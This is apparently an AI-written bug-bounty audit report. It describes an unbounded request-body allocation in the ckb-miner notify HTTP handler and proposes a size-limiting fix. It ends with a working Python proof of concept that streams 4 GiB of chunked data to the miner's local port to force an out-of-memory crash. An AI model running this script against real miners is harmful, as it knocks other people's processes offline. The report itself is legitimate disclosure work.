The code is confirmed. Let me check the security policy and scope before rendering a verdict.

Audit Report

## Title
Unbounded HTTP body allocation in miner notify handler causes OOM process termination — (File: miner/src/client.rs)

## Summary
The miner's notify-mode HTTP server, when started with `listen = Some(addr)`, collects the entire incoming request body into memory with no size cap. Any local process that can reach the listen address can POST an arbitrarily large body, exhausting the miner process's heap and triggering an OOM kill. This terminates the miner, halting all block submission until it is restarted.

## Finding Description
`listen_block_template_notify` binds a `TcpListener` and dispatches every accepted connection to the `handle` async function via `service_fn`. Inside `handle` at line 362 of `miner/src/client.rs`:

```rust
let body = BodyExt::collect(req).await?.aggregate();
```

`BodyExt::collect` streams all incoming chunks into a single in-memory `Bytes` aggregate with no upper bound. Neither the `auto::Builder` setup (lines 236–237) nor any middleware applies a body-size limit. A grep for `body_limit`, `max_body`, `content_length`, `size_limit`, `Content-Length`, and `Limited` across the entire `miner/` tree returns zero matches, confirming no guard exists anywhere in the call path.

## Impact Explanation
An attacker with local TCP access to the miner's notify port can OOM-kill the miner process, halting block submission. This matches the allowed CKB bounty impact: **Note (0–500 points) — Any local command line crash**. The miner is a local command-line tool; its crash does not directly affect the CKB node, network consensus, or economy.

## Likelihood Explanation
The default listen address is `127.0.0.1:<port>`, reachable by any unprivileged local process on Linux/macOS without credentials or elevated privileges. The notify listen feature is a documented, supported production configuration. The attack is trivially repeatable: the miner can be crashed repeatedly as soon as it is restarted.

## Recommendation
Wrap the incoming body with `http_body_util::Limited` before collecting:

```rust
use http_body_util::Limited;

const MAX_BODY: u64 = 4 * 1024 * 1024; // 4 MiB

async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let limited = Limited::new(req, MAX_BODY);
    let body = BodyExt::collect(limited).await?.aggregate();
    // ...
}
```

Alternatively, inspect the `Content-Length` header before collecting and reject requests that exceed a reasonable threshold.

## Proof of Concept
```bash
# Start ckb-miner with listen = "127.0.0.1:18114" in miner.toml
python3 -c "
import socket
s = socket.create_connection(('127.0.0.1', 18114))
header = (
    'POST / HTTP/1.1\r\n'
    'Host: 127.0.0.1\r\n'
    'Transfer-Encoding: chunked\r\n'
    'Content-Type: application/json\r\n\r\n'
).encode()
s.sendall(header)
chunk = ('1000000\r\n' + 'A' * 0x1000000 + '\r\n').encode()
for _ in range(256):   # 256 × 16 MiB = 4 GiB
    s.sendall(chunk)
s.sendall(b'0\r\n\r\n')
"
# Observe: miner process RSS grows unboundedly and is OOM-killed.
```